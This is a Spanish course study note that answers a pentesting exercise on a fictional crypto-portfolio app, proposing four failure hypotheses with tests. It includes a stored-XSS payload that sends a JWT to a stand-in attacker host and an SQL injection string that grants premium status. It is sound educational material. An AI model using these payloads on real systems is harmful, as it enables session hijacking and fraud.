> [!example] Enunciado
> La empresa _CriptoTotal_ ofrece una aplicación web y móvil para que los usuarios puedan ver, en un solo lugar, sus inversiones en distintas criptomonedas realizadas en múltiples exchanges.
>
> El registro se hace con email y contraseña, con opción de activar un segundo factor de autenticación que envía códigos de uso único por SMS. El usuario puede vincular cuentas de distintos exchanges cargando sus API keys y secret keys. La documentación comercial afirma que "las claves se almacenan cifradas en nuestra base de datos". Periódicamente, un servicio backend consulta las APIs de los exchanges vinculados, descarga balances de movimientos y los guarda en una base de datos relacional.
>
> La aplicación utiliza tokens JWT para manejar la sesión del usuario. El frontend (single page app en Javascript) almacena el JWT en localStorage y lo envía en el header `Authorization: Bearer...` en cada request al API REST. Existe un panel de administración al que acceden empleados de soporte para ver el estado de las cuentas, saldos agregados, últimos accesos y errores de sincronización.
>
> La versión "premium" de la app se paga por suscripción mensual a través de un proveedor de pagos externo, que controla todo el flujo de checkout. Al confirmarse el pago, se marca en una tabla la cuenta del usuario como `premium = true` y se habilitan funciones adicionales.
>
> En función de la descripción del sistema, establecer 4 hipótesis de falla plausibles siguiendo la metodología de pentesting. Por cada hipótesis definir una prueba siguiendo los lineamientos de la metodología.
>
> **Aclaración**: No utilizar problemas genéricos como hipótesis de falla. Plantear situaciones y lugares concretos donde podría estar el problema.

**Conceptos:**

* [[Metodología de Hipótesis de Falla]]
* [[CWE-79 - XSS]]
* [[CWE-89 - SQL Injection]]
* [[Broken Access Control]]
* [[JWT - JSON Web Token]]
* [[Sensitive Data Exposure]]

**Hipótesis 1: XSS → Robo de JWT → Session Hijacking**
- **Qué:** [[CWE-79 - XSS|Cross-Site Scripting]] almacenado que permite robar el token [[JWT - JSON Web Token|JWT]] del usuario.
- **Por qué:** El frontend guarda el JWT en localStorage, accesible desde cualquier script que se ejecute en la página. Si algún campo de input no está sanitizado (por ejemplo el nombre de usuario en el registro), un atacante puede inyectar código que se ejecute en el navegador de otros usuarios.
- **Cómo:** El atacante se registra con un nombre tipo `<script>fetch('https://atacante.com/?token='+localStorage.getItem('jwt'))</script>`. Cuando un empleado de soporte abre el panel de administración y ve la lista de usuarios, el script se ejecuta en su navegador y envía el JWT del empleado al atacante.
- **Impacto:** Con el JWT del empleado, el atacante accede al panel de administración: saldos, datos de cuentas, últimos accesos y errores de sincronización de todos los usuarios.

**Hipótesis 2: SQL Injection → Escalamiento a Premium**
- **Qué:** [[CWE-89 - SQL Injection|SQL Injection]] en el panel de administración.
- **Por qué:** El panel permite buscar cuentas por distintos criterios, generando probablemente queries a la base de datos relacional que incluye el campo `premium`.
- **Cómo:** Ingresar en el campo de búsqueda: `' OR 1=1; UPDATE usuarios SET premium = true WHERE email = 'atacante@mail.com'; --`. Se verifica si la query se ejecuta y el campo premium cambia.
- **Impacto:** El atacante obtiene acceso premium sin pagar.

**Hipótesis 3: Broken Access Control — Panel de administración**
- **Qué:** Falta de verificación de roles en los endpoints del panel de administración.
- **Por qué:** No se describe ningún mecanismo que diferencie el JWT de un usuario común del de un empleado. Si los endpoints solo verifican que el JWT sea válido sin chequear el rol, cualquier usuario autenticado podría acceder.
- **Cómo:** Un usuario común, con su JWT válido, intenta requests directos a `GET /api/admin/usuarios`, `GET /api/admin/saldos`. Si responde con datos en vez de un 403, se confirma.
- **Impacto:** [[Sensitive Data Exposure]] de todos los usuarios y violación del principio de [[Least Privilege|menor privilegio]].

**Hipótesis 4: JWT sin expiración — Sesión permanente**
- **Qué:** El token JWT no tiene expiración ni mecanismo de revocación.
- **Por qué:** No se menciona expiración, refresh tokens ni invalidación. Si no expira, es válido indefinidamente.
- **Cómo:** Decodificar el JWT (base64) y verificar si tiene campo `exp`. Probar un JWT de días/semanas atrás.
- **Impacto:** Combinado con la hipótesis 1, acceso permanente a la cuenta de la víctima aunque cambie su contraseña.
